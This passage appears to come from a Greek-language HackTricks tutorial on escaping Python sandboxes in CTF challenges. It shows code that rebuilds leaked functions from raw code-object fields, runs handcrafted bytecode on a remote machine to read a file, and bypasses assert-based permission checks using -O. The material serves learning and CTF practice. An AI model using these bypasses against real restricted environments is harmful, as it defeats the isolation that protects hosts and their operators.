36 LOAD_CONST          5 (5)
39 RETURN_VALUE
>>   40 LOAD_CONST          6 (6)
43 RETURN_VALUE
44 LOAD_CONST          0 (0)
47 RETURN_VALUE
```
## Compiling Python

Τώρα, ας φανταστούμε ότι με κάποιον τρόπο μπορείς να **κάνεις dump τις πληροφορίες σχετικά με μια function που δεν μπορείς να εκτελέσεις**, αλλά **χρειάζεται** να την **εκτελέσεις**.\
Όπως στο ακόλουθο παράδειγμα, μπορείς να **έχεις πρόσβαση στο code object** αυτής της function, αλλά απλώς διαβάζοντας το disassemble **δεν γνωρίζεις πώς να υπολογίσεις το flag** (_φαντάσου μια πιο σύνθετη function `calc_flag`_)<sup>[[3]](#references)</sup>
```python
def get_flag(some_input):
var1=1
var2="secretcode"
var3=["some","array"]
def calc_flag(flag_rot2):
return ''.join(chr(ord(c)-2) for c in flag_rot2)
if some_input == var2:
return calc_flag("VjkuKuVjgHnci")
else:
return "Nope"
```
### Δημιουργία του code object

Αρχικά, πρέπει να γνωρίζουμε **πώς να δημιουργήσουμε και να εκτελέσουμε ένα code object**, ώστε να δημιουργήσουμε ένα για να εκτελέσουμε τη function που έγινε leak:
```python
code_type = type((lambda: None).__code__)
# Check the following hint if you get an error in calling this
code_obj = code_type(co_argcount, co_kwonlyargcount,
co_nlocals, co_stacksize, co_flags,
co_code, co_consts, co_names,
co_varnames, co_filename, co_name,
co_firstlineno, co_lnotab, freevars=None,
cellvars=None)

# Execution
eval(code_obj) #Execute as a whole script

# If you have the code of a function, execute it
mydict = {}
mydict['__builtins__'] = __builtins__
function_type(code_obj, mydict, None, None, None)("secretcode")
```
> [!TIP]
> Ανάλογα με την έκδοση της Python, οι **παράμετροι** του `code_type` μπορεί να έχουν **διαφορετική σειρά**. Ο καλύτερος τρόπος για να γνωρίζετε τη σειρά των params στην έκδοση της Python που εκτελείτε είναι να εκτελέσετε:
>
> ```
> import types
> types.CodeType.__doc__
> 'code(argcount, posonlyargcount, kwonlyargcount, nlocals, stacksize,\n      flags, codestring, constants, names, varnames, filename, name,\n      firstlineno, lnotab[, freevars[, cellvars]])\n\nCreate a code object.  Not for the faint of heart.'
> ```

### Recreating a leaked function

> [!WARNING]
> Στο ακόλουθο παράδειγμα, θα λάβουμε όλα τα δεδομένα που απαιτούνται για την αναδημιουργία της function απευθείας από το function code object. Σε ένα **πραγματικό παράδειγμα**, όλες οι **τιμές** που απαιτούνται για την εκτέλεση της function μέσω του **`code_type`** είναι αυτές που θα χρειαστεί να κάνετε leak.
```python
fc = get_flag.__code__
# In a real situation the values like fc.co_argcount are the ones you need to leak
code_obj = code_type(fc.co_argcount, fc.co_kwonlyargcount, fc.co_nlocals, fc.co_stacksize, fc.co_flags, fc.co_code, fc.co_consts, fc.co_names, fc.co_varnames, fc.co_filename, fc.co_name, fc.co_firstlineno, fc.co_lnotab, cellvars=fc.co_cellvars, freevars=fc.co_freevars)

mydict = {}
mydict['__builtins__'] = __builtins__
function_type(code_obj, mydict, None, None, None)("secretcode")
#ThisIsTheFlag
```
### Παράκαμψη Άμυνων

Στα προηγούμενα παραδείγματα στην αρχή αυτού του post, μπορείτε να δείτε **πώς να εκτελέσετε οποιονδήποτε κώδικα python χρησιμοποιώντας τη συνάρτηση `compile`**. Αυτό είναι ενδιαφέρον, επειδή μπορείτε να **εκτελέσετε ολόκληρα scripts** με loops και τα πάντα σε ένα **one liner** (και θα μπορούσαμε να κάνουμε το ίδιο χρησιμοποιώντας το **`exec`**).\
Τέλος πάντων, μερικές φορές θα μπορούσε να είναι χρήσιμο να **δημιουργήσουμε** ένα **compiled object** σε ένα local machine και να το εκτελέσουμε στο **CTF machine** (για παράδειγμα, επειδή δεν έχουμε τη συνάρτηση **`compiled`** στο CTF).

Για παράδειγμα, ας κάνουμε compile και ας εκτελέσουμε χειροκίνητα μια συνάρτηση που διαβάζει το _./poc.py_:
```python
#Locally
def read():
return open("./poc.py",'r').read()

read.__code__.co_code
't\x00\x00d\x01\x00d\x02\x00\x83\x02\x00j\x01\x00\x83\x00\x00S'
```

```python
#On Remote
function_type = type(lambda: None)
code_type = type((lambda: None).__code__) #Get <type 'type'>
consts = (None, "./poc.py", 'r')
bytecode = 't\x00\x00d\x01\x00d\x02\x00\x83\x02\x00j\x01\x00\x83\x00\x00S'
names = ('open','read')

# And execute it using eval/exec
eval(code_type(0, 0, 3, 64, bytecode, consts, names, (), 'noname', '<module>', 1, '', (), ()))

#You could also execute it directly
mydict = {}
mydict['__builtins__'] = __builtins__
codeobj = code_type(0, 0, 3, 64, bytecode, consts, names, (), 'noname', '<module>', 1, '', (), ())
function_type(codeobj, mydict, None, None, None)()
```
Εάν δεν μπορείτε να αποκτήσετε πρόσβαση στα `eval` ή `exec`, θα μπορούσατε να δημιουργήσετε μια **κανονική συνάρτηση**, αλλά η άμεση κλήση της συνήθως θα αποτύχει με το μήνυμα: _ο constructor δεν είναι προσβάσιμος σε restricted mode_. Επομένως, χρειάζεστε μια **συνάρτηση που δεν βρίσκεται στο restricted environment για να καλέσει αυτήν τη συνάρτηση.**
```python
#Compile a regular print
ftype = type(lambda: None)
ctype = type((lambda: None).func_code)
f = ftype(ctype(1, 1, 1, 67, '|\x00\x00GHd\x00\x00S', (None,), (), ('s',), 'stdin', 'f', 1, ''), {})
f(42)
```
## Αποσυμπίληση Compiled Python

Με τη χρήση εργαλείων όπως το [**https://www.decompiler.com/**](https://www.decompiler.com), μπορεί κανείς να κάνει **decompile** δεδομένο compiled python code.

**Δείτε αυτό το tutorial**:


{{#ref}}
../../basic-forensic-methodology/specific-software-file-type-tricks/.pyc.md
{{#endref}}

## Διάφορα Python

### Assert

Η εκτέλεση της Python με optimizations και την παράμετρο `-O` θα αφαιρέσει τις δηλώσεις asset και οποιονδήποτε κώδικα εξαρτάται από την τιμή του **debug**.\
Επομένως, έλεγχοι όπως<sup>[[6]](#references)</sup>
```python
def check_permission(super_user):
try:
assert(super_user)
print("\nYou are a super user\n")
except AssertionError:
print(f"\nNot a Super User!!!\n")
```
θα παρακαμφθεί

## Αναφορές

- [1] [Pyjail](https://lbarman.ch/blog/pyjail/)
- [2] [Python Sandbox Escape - CTF Wiki](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/sandbox/python-sandbox-escape/)
- [3] [Escaping a Python sandbox (NdH 2013 quals writeup)](https://blog.delroth.net/2013/03/escaping-a-python-sandbox-ndh-2013-quals-writeup/)
- [4] [Python 'sandbox' escape](https://gynvael.coldwind.pl/n/python_sandbox_escape)
- [5] [Το eval είναι πραγματικά επικίνδυνο](https://nedbatchelder.com/blog/201206/eval_really_is_dangerous.html)
- [6] [Πώς τα Assertions μπορούν να σας κάνουν Hack](https://infosecwriteups.com/how-assertions-can-get-you-hacked-da22c84fb8f6)
- [7] [CVE-2023-33733 (RCE αξιολόγησης εκφράσεων rl_safe_eval του ReportLab) – NVD](https://nvd.nist.gov/vuln/detail/cve-2023-33733)
- [8] [c53elyas/CVE-2023-33733 PoC και write-up](https://github.com/c53elyas/CVE-2023-33733)
- [9] [0xdf: University (HTB) – Εκμετάλλευση του xhtml2pdf/ReportLab CVE-2023-33733 για απόκτηση RCE](https://0xdf.gitlab.io/2025/08/09/htb-university.html)
- [10] [0xdf: HTB Interpreter – RCE του Mirth Connect XStream, cracking hash του Mirth και κλιμάκωση προνομίων μέσω αξιολόγησης f-string του Flask](https://0xdf.gitlab.io/2026/05/30/htb-interpreter.html)
- [11] [SECCON CTF 2022 Quals: Author writeups (English)](https://blog.arkark.dev/2022/11/18/seccon-en/#misc-latexipy)
- [12] [Ανατομία ενός LLM RCE - CyberArk Threat Research Blog](https://www.cyberark.com/resources/threat-research-blog/anatomy-of-an-llm-rce)
- [13] [BuckeyeCTF 2024 Author Writeups](https://corgi.rip/posts/buckeye-writeups/)
- [14] [GeeksforGeeks – Ευπάθεια στο str.format() στην Python](https://www.geeksforgeeks.org/vulnerability-in-str-format-in-python/)
- [15] [ur4ndom – [GCTF 2022] Treebox](https://ur4ndom.dev/posts/2022-07-04-gctf-treebox/)
- [16] [checkoway.net - Musings - Pickle](https://checkoway.net/musings/pickle)

{{#include ../../../banners/hacktricks-training.md}}
